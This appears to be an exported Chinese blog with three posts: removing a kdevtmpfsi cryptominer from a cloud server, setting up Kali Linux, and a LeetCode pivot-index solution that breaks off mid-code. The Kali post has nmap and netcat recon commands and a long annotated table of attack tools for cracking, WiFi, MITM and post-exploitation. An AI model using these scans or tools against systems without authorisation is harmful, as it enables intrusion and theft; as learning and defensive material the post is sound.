<li>某一天，我写完本地程序，准备部署到云服务器，然而我的<code>xshell</code>始终是连接不上服务器，或者是连接上反应非常慢，我怀疑阿里云对我的服务器动了什么了（实在是对不住，毕竟我也不知道还有这种事情），然后通过阿里云控制台，发现出现了CPU占用非常高，基本上就100%了，并且内存的占用也是非常高。通过登录服务器，具体查看，然后使用命令查看，确实正如控制台的监控系统所展示的那样。</li>
</ul>
<h2 id="命令以及过程"><a href="#命令以及过程" class="headerlink" title="命令以及过程"></a>命令以及过程</h2><ul>
<li><p>查看cpu占用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看异常进程 <code>kdevtmpfsi</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep kdevtmpfsi</span><br></pre></td></tr></table></figure>
</li>
<li><p>处理异常定时任务</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看定时任务，找出异常任务</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"># 删除一次任务</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>



<ul>
<li><p>查看和其相关联的进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status pid</span><br><span class="line"># pid 为kdevtmpfsi的进程号</span><br></pre></td></tr></table></figure>


</li>
<li><p>杀掉进程(包括其守护进程，由上一步可以看出)，先杀守护进程，后杀挖矿进程</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>

<ul>
<li>删除守护进程文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找守护进程相关文件</span><br><span class="line">find / -name kins*</span><br><span class="line"></span><br><span class="line"># 删除文件</span><br><span class="line">rm -rf path</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>删除挖矿程序文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找文件</span><br><span class="line">find / -name kdevtmpfsi*</span><br><span class="line"># 删除</span><br><span class="line">rm -rf path</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>云服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>kail的搭建</title>
    <url>/aposts/403e45c/</url>
    <content><![CDATA[<h2 id="什么是kail"><a href="#什么是kail" class="headerlink" title="什么是kail"></a>什么是kail</h2><ul>
<li><p>Kali是基于Debian的Linux发行版操作系统，一开始是由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，用来进行数字取证。</p>
</li>
<li><p>而且它拥有超过300个渗透测试工具，拥有开源Git树等，甚至还集成了600多种黑客工具，完全可以想象到它的强大性。此外大家还可以永久免费使用Kali操作系统！</p>
</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li><p>打开官网，选择需要的<a href="https://www.kali.org/get-kali/#kali-virtual-machines">镜像文件</a></p>
</li>
<li><p>我下载的是VirtualBox的版本</p>
</li>
</ul>
<p><img src="/aposts/403e45c/image-20220218163325420.png" alt="image-20220218163325420"></p>
<p>打开VirtualBox，点击导入</p>
<p><img src="/aposts/403e45c/image-20220218163747664.png" alt="image-20220218163747664"></p>
<p>选择下载的文件</p>
<p><img src="/aposts/403e45c/image-20220218163824124.png" alt="image-20220218163824124"></p>
<p>点击导入</p>
<p><img src="/aposts/403e45c/image-20220218163910423.png" alt="image-20220218163910423"></p>
<p>有个弹框，点击同意，然后等待中</p>
<p><img src="/aposts/403e45c/image-20220218163946035.png" alt="image-20220218163946035"></p>
<p>然后点击启动</p>
<p><img src="/aposts/403e45c/image-20220218164250304.png" alt="image-20220218164250304"></p>
<ul>
<li><p>打开后要输入默认<strong>用户名和密码：kali</strong></p>
</li>
<li><p>ping下，网络已经通了</p>
</li>
</ul>
<p><img src="/aposts/403e45c/image-20220218164752238.png" alt="image-20220218164752238"></p>
<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul>
<li><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具.</p>
</li>
<li><p>核心功能: 主机发现,端口扫描,版本侦测,操作系统侦测,防火墙&#x2F;IDS规避和哄骗</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping扫描: nmap -sT -v target_ip</span><br><span class="line"></span><br><span class="line">快速端口扫描:nmap -F -v target_ip</span><br><span class="line"></span><br><span class="line">版本扫描: nmap -sV -v target_ip</span><br><span class="line"></span><br><span class="line">操作系统扫描:nmap -O -v target_ip</span><br><span class="line">TCP扫描：</span><br><span class="line">nmap -sT target_ip</span><br><span class="line">nmap -sS target_ip</span><br></pre></td></tr></table></figure>

<h3 id="NETCAT-NC-瑞士军刀"><a href="#NETCAT-NC-瑞士军刀" class="headerlink" title="NETCAT-NC(瑞士军刀)"></a>NETCAT-NC(瑞士军刀)</h3><p>在网络工具中有“瑞士军刀”美誉，其有Windows和Linux的版本。因为它短小精悍（1.84版本也不过25k，旧版本或缩减版甚至更小）、功能实用，被设计为一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。</p>
<h4 id="获取banner模式"><a href="#获取banner模式" class="headerlink" title="获取banner模式"></a>获取banner模式</h4><ul>
<li><p>Banner信息：欢迎语，在Banner信息中可以的到软件开发商、软件名称、版本、服务类型等信息，通过这些信息可以使用某些工具，直接去使用相对应的EXP去攻击</p>
</li>
<li><p>前提条件：需要和目标建立连接，只有建立了链接，才能获取对应的Banner信息</p>
</li>
<li><p>注：目标服务器上可能对Banner信息进行了隐藏或禁止读取</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 一开始可以用nmap扫描到端口</span><br><span class="line">nmap -sT target_ip</span><br><span class="line"># 然后用nc获取到这些端口信息</span><br><span class="line">nc -vn ip 110(POP3服务器的110端口)</span><br><span class="line"></span><br><span class="line">nc -nv ip 25(SMTP服务器的25端口)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h4><p>服务器：nc -l -p 端口号</p>
<p>客户端：nc -nv 服务器的ip 端口号</p>
<p>有兴趣可以参考<a href="https://blog.csdn.net/u014596135/article/details/83830590?spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-9.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-9.pc_relevant_default&utm_relevant_index=13">这里更多实例</a></p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>当然最重要的工具之一就是自带Metasploit，后续文章有单据介绍</p>
<h2 id="更多工具库"><a href="#更多工具库" class="headerlink" title="更多工具库"></a>更多工具库</h2><ul>
<li>注意有些工具官网已经更新，可能名字改了，请查看<a href="https://www.kali.org/tools/">官网的详细说明</a></li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>类型</th>
<th>使用模式</th>
<th>功能</th>
<th>功能评价</th>
</tr>
</thead>
<tbody><tr>
<td>dmitry</td>
<td>信息收集</td>
<td></td>
<td>whois查询&#x2F;子域名收集&#x2F;端口扫描</td>
<td>whois并不简单明了；子域名和邮箱依赖google；端口扫描速度一般</td>
</tr>
<tr>
<td>dnmap</td>
<td>信息收集</td>
<td></td>
<td>用于组建分布式nmap，dnmap_server为服务端；dnmap_client为客户端</td>
<td>用起来并不是那么方便，不是实在不行不是很必要</td>
</tr>
<tr>
<td>ike-scan</td>
<td>信息收集</td>
<td></td>
<td>收集ipsec vpn server指纹信息</td>
<td>好像用于攻击vpn，不太懂</td>
</tr>
<tr>
<td>maltegoce</td>
<td>信息收集</td>
<td>gui</td>
<td>域名&#x2F;账号等关联性收集展示</td>
<td>关联性展示功能确实很好，但效果可能没有那么理想，特别是对国内而言</td>
</tr>
<tr>
<td>netdiscover</td>
<td>信息收集</td>
<td></td>
<td>主动发出arp包和截获arp包</td>
<td>就arp探测功能就此功能本身而言做得算很好了</td>
</tr>
<tr>
<td>nmap</td>
<td>信息收集</td>
<td>cmd-line</td>
<td>端口服务探测和端口漏洞扫描</td>
<td>端口扫描集大成者</td>
</tr>
<tr>
<td>p0f</td>
<td>信息收集</td>
<td>cmd-line</td>
<td>监听网卡收发的数据包，从数据包中读取远端机器操作系统服务版本等信息</td>
<td>毕竟只是截取数据 包中的版本信息，效果期望不要很大</td>
</tr>
<tr>
<td>regon-ng</td>
<td>信息收集</td>
<td>shell</td>
<td>模仿msf的信息侦查框架</td>
<td>类似将站长工具等东西命令行化，想法挺好但是用起来感觉不是那么直观</td>
</tr>
<tr>
<td>sparta</td>
<td>暴力破解</td>
<td>gui</td>
<td>图形版的hydra，加了端口服务扫描功能</td>
<td>还行图形界面聊胜于无</td>
</tr>
<tr>
<td>zenmap</td>
<td>信息收集</td>
<td>gui</td>
<td>图形界面版的nmap</td>
<td>还行图形界面聊胜于无</td>
</tr>
<tr>
<td>golismero</td>
<td>web扫描</td>
<td>cmd-line</td>
<td>就是一个文本版的类似awvs的web扫描器</td>
<td>感觉可以提升对扫描器原理的认识</td>
</tr>
<tr>
<td>lynis</td>
<td>系统审计</td>
<td></td>
<td>感觉有点像360首页的“立即体验”，不过只是扫描告警不能一键修复</td>
<td>shell脚本写成颇为有趣</td>
</tr>
<tr>
<td>nikto</td>
<td>web扫描</td>
<td></td>
<td>中间件扫描器，扫描tomcat等中间件的错误配置、存在漏洞等</td>
<td>就喜欢这种直接告漏洞的扫描器（不过事实上很少能有可用的漏洞）</td>
</tr>
<tr>
<td>unix-privesc-check</td>
<td>系统审计</td>
<td></td>
<td>审计系统中的关键文件权限是否有异常</td>
<td>还是没有总结性展示和修复功能</td>
</tr>
<tr>
<td>bed</td>
<td>系统扫描</td>
<td></td>
<td>通过发送各种模糊数据测试多种服务的缓冲区溢出漏洞的工具</td>
<td>可能还不错</td>
</tr>
<tr>
<td>burpsuite</td>
<td>web代理</td>
<td></td>
<td>常用web代理截包工具</td>
<td>功能强大不能要求更多</td>
</tr>
<tr>
<td>commix</td>
<td>注入检测</td>
<td></td>
<td>sqlmap检测sql注入此工具检测系统命令注入</td>
<td>两相搭配那注入基本覆盖了</td>
</tr>
<tr>
<td>httrack</td>
<td>网站克隆</td>
<td></td>
<td>将网站克隆到本地</td>
<td>钓鱼乌云等可能有用</td>
</tr>
<tr>
<td>owasp-zap</td>
<td>web代理</td>
<td>gui</td>
<td>owasp组织开发的工具</td>
<td>和burpsuite相比弱化了截包功能，强化了web漏洞扫描功能，不过感觉也没扫出什么东西</td>
</tr>
<tr>
<td>paros</td>
<td>web扫描</td>
<td>gui</td>
<td>一个web爬行和漏扫工具</td>
<td>和owasp-zap差不多</td>
</tr>
<tr>
<td>skipfish</td>
<td>web扫描</td>
<td>cmd-line</td>
<td>一个全自动化的web漏洞扫描工具</td>
<td>其工作一是爬行网站页面，然后分析页面漏洞，最后生html报告</td>
</tr>
<tr>
<td>sqlmap</td>
<td>sql注入扫描</td>
<td>cmd-line</td>
<td>一个强大的sql注入扫描工具</td>
<td></td>
</tr>
<tr>
<td>w3af</td>
<td>web扫描</td>
<td>shell&#x2F;gui</td>
<td>一个web漏洞扫描框架</td>
<td>所谓框架就是有一堆扫描模块，然后你选定其中一些模块去扫描网站；感觉一般没说的那么好</td>
</tr>
<tr>
<td>webscarab</td>
<td>http代理</td>
<td>gui</td>
<td>更专业的网站树型结构分析工具</td>
<td></td>
</tr>
<tr>
<td>wpscan</td>
<td>web扫描</td>
<td></td>
<td>针对wordpress的漏洞扫描工具</td>
<td></td>
</tr>
<tr>
<td>bbqsql</td>
<td>盲注扫描</td>
<td>shell</td>
<td>一个高度可配置的交互式的sql盲注工具</td>
<td></td>
</tr>
<tr>
<td>hexorbase</td>
<td>数据库管理</td>
<td>gui</td>
<td>一个支持多种数据库的客户端有多个数据库的口令破解功能</td>
<td>作为客户端只能将就着用。暴破口令需要自己准备字典</td>
</tr>
<tr>
<td>jsql</td>
<td>数据库探测</td>
<td>gui</td>
<td>根据url探测数据库类型&#x2F;参数注入测试&#x2F;探测后台页而&#x2F;探测重要文件</td>
<td></td>
</tr>
<tr>
<td>mdb-sql</td>
<td>数据库管理</td>
<td>cmd-line</td>
<td>可用来连接access数据库文件（mdb）然后通过sql语句查询数据</td>
<td></td>
</tr>
<tr>
<td>oscaner</td>
<td>数据库猜解</td>
<td>cmd-line</td>
<td>用字典探查oracle数据库是否监听及猜解服务名</td>
<td>参数很少。测试sid和默认用户是可以的，默认的字典基本没法看还是得自己写字典</td>
</tr>
<tr>
<td>sidguesser</td>
<td>数据库猜解</td>
<td>cmd-line</td>
<td>用字典探测oracle数据库存在的sid</td>
<td>参数很少。测试验证如果字典里有sid，可以探测出sid。基于字典的工具还是得自己准备字典</td>
</tr>
<tr>
<td>sqllite database</td>
<td>数据库管理</td>
<td>gui</td>
<td>sqlite数据库客户端</td>
<td></td>
</tr>
<tr>
<td>sqlinja</td>
<td>数据库猜解</td>
<td>cmd-line</td>
<td>用于猜解ms sql</td>
<td></td>
</tr>
<tr>
<td>sqlsus</td>
<td>sql注入检测</td>
<td>cmd-line</td>
<td>用于mysql的盲注检测</td>
<td></td>
</tr>
<tr>
<td>tnscmd10g</td>
<td>数据库探测</td>
<td>cmd-line</td>
<td>用于探测oracle是否监听及其他一些信息</td>
<td></td>
</tr>
<tr>
<td>cewl</td>
<td>口令文件制作</td>
<td>cmd-line</td>
<td>爬取给定的URL并依据限制条件截取网页中的单词生成口令集合</td>
<td>这种想法是可取的。但有点遗憾只是截取网页中的单词，没有a转@等等智能变换</td>
</tr>
<tr>
<td>crunch</td>
<td>口令文件制作</td>
<td>cmd-line</td>
<td>依据限定的条件生成口令集合</td>
<td></td>
</tr>
<tr>
<td>hashcat</td>
<td>hash爆破</td>
<td>cmd-line</td>
<td>多种hash的爆力猜解工具，速度快所耗CPU小（相对）</td>
<td></td>
</tr>
<tr>
<td>john</td>
<td>系统口令破解</td>
<td>cmd-line</td>
<td>用于对系统口令文件的破解（如&#x2F;etc&#x2F;passwd）还原出密码明文</td>
<td></td>
</tr>
<tr>
<td>johnny</td>
<td>系统口令破解</td>
<td>gui</td>
<td>john的gui版本</td>
<td></td>
</tr>
<tr>
<td>medusa</td>
<td>口令猜解</td>
<td>cmd-line</td>
<td>可对IMAP, rlogin, SSH等进行口令猜解，类似hydra</td>
<td></td>
</tr>
<tr>
<td>ncrack</td>
<td>口令猜解</td>
<td>cmd-line</td>
<td>可对IMAP, rlogin, SSH等进行口令猜解，类似hydra</td>
<td></td>
</tr>
<tr>
<td>ophcrack</td>
<td>系统口令破解</td>
<td>gui</td>
<td>基于彩虹表的windows口令破解工具</td>
<td></td>
</tr>
<tr>
<td>pyrit</td>
<td>wifi破解</td>
<td>cmd-line</td>
<td>WPA&#x2F;WPA2加密的wifi的密码破解工具</td>
<td></td>
</tr>
<tr>
<td>rainbowcrack</td>
<td>hash破解</td>
<td>cmd-line</td>
<td>具有彩虹表的生成、排序和使用排序好换彩虹表进行破解的功能</td>
<td></td>
</tr>
<tr>
<td>rcracki_mt</td>
<td>hash破解</td>
<td>cmd-line</td>
<td>基于彩虹表的hash破解工具，可能蚲rainbowcrack一部份</td>
<td></td>
</tr>
<tr>
<td>wordlist</td>
<td>口令文件</td>
<td>cmd-line</td>
<td>打印kali自带的一些口令文件存放的位置</td>
<td></td>
</tr>
<tr>
<td>aircrack-ng</td>
<td>wifi破解</td>
<td>cmd-line</td>
<td>针对WEP、 WPA加密方式的wifi密码破解套件</td>
<td></td>
</tr>
<tr>
<td>chirp</td>
<td>无线电拦截</td>
<td>gui</td>
<td>各种无线电数据包的拦截工具（？）</td>
<td></td>
</tr>
<tr>
<td>cowpatty</td>
<td>wifi破解</td>
<td>cmd-line</td>
<td>基于已捕获握手包和密码字典的WPA-PSK加密的wifi密码的猜解</td>
<td>不能自己拦截数据包也只能破解WPA-PSK类加密方式功能有点弱</td>
</tr>
<tr>
<td>Fern WIFI Cracker</td>
<td>wifi破解</td>
<td>gui</td>
<td>基于字典的WEP和WPA加密的wifi破解工具</td>
<td>能自动发现wifi能拦截数据包，图形界面操作，简单易用</td>
</tr>
<tr>
<td>Ghost Phiser</td>
<td>AP假冒</td>
<td>gui</td>
<td>能发现AP并使与AP连接的设备断开连接然后假冒AP让设备重新连接</td>
<td>图形界面除了AP外还有假冒DNS、http服务器等，较为好用</td>
</tr>
<tr>
<td>giskismet</td>
<td>可视化</td>
<td>gui</td>
<td>Kismet输出结果的可视化工具，即较成text、html等各种格式</td>
<td></td>
</tr>
<tr>
<td>kismet</td>
<td>AP发现</td>
<td>shell</td>
<td>交互式的AP发现工具，列出周围AP的各种信息</td>
<td></td>
</tr>
<tr>
<td>MDK3</td>
<td>AP扰乱</td>
<td>cmd-line</td>
<td>可向AP发送大量连接、断开请求，可向周围设备告知存在根本不存在的大量AP</td>
<td>这工具的攻击方法简直是发了疯</td>
</tr>
<tr>
<td>mfor</td>
<td>IC卡破解</td>
<td>cmd-line</td>
<td>IC卡密钥破解程序</td>
<td>各种免费吃饭充钱教程里用的工具你想不想学</td>
</tr>
<tr>
<td>mfterm</td>
<td>IC卡破解</td>
<td>shell</td>
<td>交互式IC卡文件写入工具</td>
<td>要修改卡内数据才是最终的IC卡破解</td>
</tr>
<tr>
<td>pixiewps</td>
<td>wifi破解</td>
<td>cmd-line</td>
<td>针对开启WPS的wifi利用WPS随机数生成中的bug来破解</td>
<td>有说很快有说成功率比较低</td>
</tr>
<tr>
<td>reaver</td>
<td>wifi破解</td>
<td>cmd-line</td>
<td>针对开启WPS的wifi进行暴力破解的工具</td>
<td>aircrack-ng后排名第二的wifi破解工具</td>
</tr>
<tr>
<td>wifite</td>
<td>wifi破解</td>
<td>cmd-line</td>
<td>较为自动化的wifi破解工具</td>
<td></td>
</tr>
<tr>
<td>apktool</td>
<td>安卓逆向</td>
<td>cmd-line</td>
<td>从apk文件中还原出xml和图版等资源文件</td>
<td></td>
</tr>
<tr>
<td>clang</td>
<td>编译器</td>
<td>cmd-line</td>
<td>类似gcc的编译器，更轻量，可编译c、c++、Objective-C</td>
<td></td>
</tr>
<tr>
<td>clang++</td>
<td>编译器</td>
<td>cmd-line</td>
<td>C++编译器，与clang的关系类似gcc和g++的类系</td>
<td></td>
</tr>
<tr>
<td>dex2jar</td>
<td>安卓逆向</td>
<td>cmd-line</td>
<td>apktool把apk还原成了资源文件和dex，dex2jar把dex还原成jar文件（.class）</td>
<td></td>
</tr>
<tr>
<td>edb-debug</td>
<td>动态调试</td>
<td>gui</td>
<td>软件逆向动态调试工具</td>
<td>Linux版Ollydbg</td>
</tr>
<tr>
<td>flashm</td>
<td>反汇编</td>
<td>cmd-line</td>
<td>.swf文件的反汇编工具可反汇编出.swf中的脚本代码</td>
<td></td>
</tr>
<tr>
<td>jad</td>
<td>反编译</td>
<td>cmd-line</td>
<td>dex2jar把文件还原成了.class，jad进一步把文件还原成.java文件</td>
<td></td>
</tr>
<tr>
<td>javasnoop</td>
<td>fuzz</td>
<td>gui</td>
<td>java程序漏洞评估工具</td>
<td></td>
</tr>
<tr>
<td>nasm shell</td>
<td>汇编</td>
<td>shell</td>
<td>nasm是32位汇编编译器，这是一个nasm的shell</td>
<td></td>
</tr>
<tr>
<td>ollydbg</td>
<td>动态调试</td>
<td>gui</td>
<td>windows平台大名鼎鼎的动态调试工具，Linux上是通过wine运行有点水土不服</td>
<td></td>
</tr>
<tr>
<td>radare2</td>
<td>静态分析</td>
<td>cmd-line</td>
<td>类似ida的静态反汇编分析工具，功能强大，开源</td>
<td>但是命令行操作这难度有点大</td>
</tr>
<tr>
<td>armitage</td>
<td>漏洞利用</td>
<td>gui</td>
<td>measploit的gui界面</td>
<td>嗯好像是比原来的msf-gui好点，不过叫人自己去启动msf还要登录，还是不用算了</td>
</tr>
<tr>
<td>beef</td>
<td>漏洞利用</td>
<td>cmd-line</td>
<td>利用msf的exp结合xss构造有攻击性的html页面，当浏览器访问即会受到攻击并获取shell</td>
<td>这可以啊，不过不懂对现在浏览器效果怎么样</td>
</tr>
<tr>
<td>metasploit</td>
<td>漏洞利用</td>
<td>shell</td>
<td>就是启动msfconsole咯</td>
<td></td>
</tr>
<tr>
<td>msf payload center</td>
<td>漏洞利用</td>
<td>cmd-line</td>
<td>生成包含exp的windows&#x2F;android等各平台的可执行文件，木马制作利器</td>
<td>那这东西和msfvenom的区别是什么</td>
</tr>
<tr>
<td>searchsploit</td>
<td>漏洞利用</td>
<td>cmd-line</td>
<td>用于搜索已从exploitdb下载到本地的漏洞利用脚本</td>
<td>可以理解msf都是ruby写的可执行代码，exploit不一定用ruby写，也可能只是扫描述而非代码</td>
</tr>
<tr>
<td>Social-Engineering</td>
<td>漏洞利用</td>
<td>shell</td>
<td>一般用于生成各种插入了exp的文件，诱使目标打开而中招</td>
<td>社会工程学总说得很厉害，不过我总觉得社会工程学和DDOS就是最名不副实的</td>
</tr>
<tr>
<td>termineter</td>
<td>漏洞利用</td>
<td>shell</td>
<td>智能电表攻击框架</td>
<td>这需要硬件搭配吧，没玩过</td>
</tr>
<tr>
<td>bdfproxy</td>
<td>中间人攻击</td>
<td></td>
<td>处于中间人身份时可对经过的流量插入payload</td>
<td></td>
</tr>
<tr>
<td>driftnet</td>
<td>图版嗅探</td>
<td>cmd-line</td>
<td>用于嗅探流量中的图版并展示到x-window上</td>
<td>配上arp欺骗作为中间人才能发挥威力，自己拦自己的就好玩而已</td>
</tr>
<tr>
<td>ettercap</td>
<td>流量拦截</td>
<td>gui</td>
<td>听说可以截持同子网的流量，强无敌，原理是什么</td>
<td></td>
</tr>
<tr>
<td>hampster</td>
<td>代理</td>
<td>cmd-line</td>
<td>好像也是代理转发流量的</td>
<td></td>
</tr>
<tr>
<td>macchanger</td>
<td>mac欺骗</td>
<td>cmd-line</td>
<td>修改本机上网时的mac地址，一用作身份隐藏，二可用来绕过wifi mac黑名单</td>
<td>应该只是软修改mac地址不可能可写吧</td>
</tr>
<tr>
<td>mitmproxy</td>
<td>代理</td>
<td>cmd-line</td>
<td>好像也是代理转发流量的</td>
<td>感觉没什么特色啊</td>
</tr>
<tr>
<td>netsniff-ng</td>
<td>流量捕获</td>
<td>cmd-line</td>
<td>高性能的流量捕获套件，可能大流量时的捕获效果比较稳定</td>
<td></td>
</tr>
<tr>
<td>responder</td>
<td>主机嗅探</td>
<td>cmd-line</td>
<td>被动嗅探与所在主机交互的主机的操作系统版本等信息</td>
<td></td>
</tr>
<tr>
<td>wireshark</td>
<td>流量捕获</td>
<td>gui</td>
<td>拦截经过指定网卡的所有流量</td>
<td>sectools常年排行第一的工具，这就不用多说了吧</td>
</tr>
<tr>
<td>backdoor</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>exe2hex</td>
<td>编码转换</td>
<td>cmd</td>
<td>顾名思义就是把exe文件转成十六进制文件</td>
<td>不过这样的意义是什么，不是以十六进制就能打开了吗</td>
</tr>
<tr>
<td>Intersect</td>
<td>脚本生成</td>
<td>shell</td>
<td>感觉是SQL 有攻击性Intersect语句的生成工具</td>
<td></td>
</tr>
<tr>
<td>mimikatz</td>
<td>密码提取</td>
<td>cmd-line</td>
<td>用于从windows内存中提取密码</td>
<td></td>
</tr>
<tr>
<td>nishang</td>
<td>后渗透</td>
<td>cmd-line</td>
<td>基于powershell的后渗透攻击工具</td>
<td></td>
</tr>
<tr>
<td>PowerSploit</td>
<td>后渗透</td>
<td>cmd-line</td>
<td>也是一个基于powershell的后渗透攻击工具</td>
<td></td>
</tr>
<tr>
<td>proxychains</td>
<td>多重代理</td>
<td>cmd-line</td>
<td>好像用来配置多种代理的</td>
<td></td>
</tr>
<tr>
<td>weevely</td>
<td>webshell</td>
<td>shell</td>
<td>webshell连接工具不过好像要用自己生成的小马</td>
<td></td>
</tr>
<tr>
<td>autopsy</td>
<td>网页分析</td>
<td>web</td>
<td>启动一个服务通过浏览器访问使用，感觉是分析网页各种元素的不是很懂</td>
<td></td>
</tr>
<tr>
<td>binwalk</td>
<td>文件识别</td>
<td>cmd-line</td>
<td>用于分析一个文件中是否其实有多个文件</td>
<td>ctf的key文件提取就常用到的</td>
</tr>
<tr>
<td>bulk_extractor</td>
<td>要素提取</td>
<td>cmd-line</td>
<td>扫描给定的目录或文件，如果发现一些如电话号码网址等关键的信息则输出到文件</td>
<td></td>
</tr>
<tr>
<td>chkrootkit</td>
<td>系统检查</td>
<td>cmd-line</td>
<td>扫描本机，查看本机是否存在受rootkit影响的地方</td>
<td>理解成360的木马查杀也差不多</td>
</tr>
<tr>
<td>foremost</td>
<td>文件恢复</td>
<td>cmd-line</td>
<td>文件恢复工具，用于被删除的文件的恢复，就是360等的那个文件恢复功能</td>
<td></td>
</tr>
<tr>
<td>galleta</td>
<td>cookie文件</td>
<td>cmd-line</td>
<td>用于分析IE的cookie文件输出其中的有用信息</td>
<td></td>
</tr>
<tr>
<td>hashdeep</td>
<td>hash计算</td>
<td>cmd-line</td>
<td>用于计算文件hash值，支持多种散列算法</td>
<td></td>
</tr>
<tr>
<td>volafox</td>
<td>内存分析</td>
<td>cmd-line</td>
<td>针对Mac OS X的内存分析工具，可从其内存镜像中读取进程列表等各种主机信息</td>
<td>先用工具把当前内存抓取下来，然后再用来分析；内存数据容易被破坏所以这确实很有意义</td>
</tr>
<tr>
<td><a href="http://www.jianshu.com/p/5f13ee20f5b0">volatility</a></td>
<td>内存分析</td>
<td>cmd-line</td>
<td>volafox的扩展，支持Mac OS X&#x2F;Linux&#x2F;Windows</td>
<td></td>
</tr>
<tr>
<td>casefile</td>
<td>报告编写</td>
<td>gui</td>
<td>一个画图工具，packet tracer用来画网络拓扑，这用来画场景拓扑</td>
<td>这写出高大上的报告啊</td>
</tr>
<tr>
<td>cutycapt</td>
<td>网页截屏</td>
<td>cmd-line</td>
<td>一个基于WebKit内核的网页截图工具，就是指定一个url它就能用解析url并把url界面截下来</td>
<td>各种扫描器中的截图就是使用类似的工具完成的，并不会真用个浏览器访问再截图下来</td>
</tr>
<tr>
<td>dradis</td>
<td>报告生成</td>
<td>web</td>
<td>可解析burpsuite&#x2F;nmap等生成的扫描文件，并可将扫描结果转存为pdf或html</td>
<td></td>
</tr>
<tr>
<td>faraday IDE</td>
<td>报告管理</td>
<td>gui</td>
<td></td>
<td></td>
</tr>
<tr>
<td>keepnote</td>
<td>笔记本</td>
<td>gui</td>
<td>较之记事本，可建文件夹，支持富文本，可导出为其他格式</td>
<td></td>
</tr>
<tr>
<td>magictree</td>
<td>报告管理</td>
<td>gui</td>
<td></td>
<td></td>
</tr>
<tr>
<td>pipal</td>
<td>词频统计</td>
<td>cmd-line</td>
<td>说词频统计并不是很准确，文命令可分析统计给定文件中的词语的“<a href="http://www.freebuf.com/sectool/49592.html">各种最</a>”</td>
<td></td>
</tr>
<tr>
<td>recordmydesktop</td>
<td>屏幕录制</td>
<td>cmd-line</td>
<td>屏幕录制，输出.ogv格式视频</td>
<td>不过感觉这视频格式占用磁盘有点大啊</td>
</tr>
<tr>
<td>maltegoce</td>
<td>关系分析</td>
<td>gui</td>
<td>通过网络搜索，获取某个IP或邮箱与其他IP或邮箱的拓扑关系</td>
<td>这东西有那么强，但社工的东西还是没那么强，而且还是外国的工具在天朝的网络</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>环境搭建</tag>
        <tag>kail</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-0724-寻找数组的中心下标</title>
    <url>/aposts/2bfb77a5/</url>
    <content><![CDATA[<h1 id="0724-寻找数组的中心下标"><a href="#0724-寻找数组的中心下标" class="headerlink" title="0724. 寻找数组的中心下标"></a>0724. 寻找数组的中心下标</h1><ul>
<li>标签：数组</li>
<li>难度：简单</li>
</ul>
<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p>给定一个数组 nums，找到「左侧元素和」与「右侧元素和相等」的位置(索引)，若找不到，则返回 -1。</p>
<h2 id="解体思路1"><a href="#解体思路1" class="headerlink" title="解体思路1"></a>解体思路1</h2><p>除去中心索引，左边数和&#x3D;&#x3D;右边数和</p>
<ul>
<li>先将数组全部的数和求出，作为右边的数</li>
<li>左边做加法，右边做减法，对比左边和右边的值是否相等</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">   </span><br><span class="line">    def pivotIndex1(self, nums):</span><br><span class="line">        left = 0</span><br><span class="line">        right = 0</span><br><span class="line">        for index in range(len(nums)):</span><br><span class="line">            # 先将数组全部的数和求出，作为右边的数</span><br><span class="line">            right += nums[index]</span><br><span class="line">        right = sum(nums)</span><br><span class="line">        for move in range(len(nums)):</span><br><span class="line">            # 右边做减法</span><br><span class="line">            right -= nums[move]</span><br><span class="line">            print(&quot;--right:%s--index-%s-&quot; % (right,move))</span><br><span class="line">            # 当左边和右边的值相等，返回当前索引</span><br><span class="line">            if left == right:</span><br><span class="line">                return move</span><br><span class="line">            # 左边做加法</span><br><span class="line">            left += nums[move]</span><br><span class="line">            print(&quot;--left:%s--index-%s-&quot; % (left,move))</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span 